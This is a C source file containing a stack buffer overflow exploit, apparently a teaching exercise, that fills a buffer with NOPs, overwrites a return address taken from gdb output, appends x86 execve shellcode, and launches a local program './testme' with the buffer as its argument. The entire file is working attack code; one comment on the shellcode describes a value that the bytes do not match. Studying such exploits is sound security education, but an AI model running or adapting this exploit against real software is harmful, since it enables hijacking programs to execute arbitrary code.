#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char binaryCode[]=
"\x31\xc0" /* xorl %eax,%eax */
"\x50" /* pushl %eax */
"\x68""./harsh" /* pushl $0x68732f2f */
"\x89\xe3" /* movl %esp,%ebx */
"\x50" /* pushl %eax */
"\x53" /* pushl %ebx */
"\x89\xe1" /* movl %esp,%ecx */
"\x99" /* cdq */
"\xb0\x0b" /* movb $0x0b,%al */
"\xcd\x80" /* int $0x80 */
;

void main(int argc, char **argv)
{
	char charBuffer[500];

	// Fill the charBuffer with NOPs
	memset(&charBuffer, 0x90, 500);

/*
  This address need to taken from debugging. 
  (gdb) b exploitable
		.....
	(gdb) r
		.....
	(gdb) p $ebp
	$1 = (void *) 0xffffd438
	(gdb) p &charBuffer
	$2 = (char (*)[10]) 0xffffd426
*/

	// Fill the return address field with a candidate entry point of the malicious code. *(charBuffer + 22) points to the return address.
	*((long *) (charBuffer + 22)) = 0xffffd438 + 0x60;
	// Place the malicioud code towards the end of the charBuffer.
	memcpy(charBuffer + sizeof(charBuffer) - sizeof(binaryCode), binaryCode, sizeof(binaryCode));
	// Call testme with charBuffer as the commandline argument
	execl("./testme", "testme", charBuffer, NULL);
}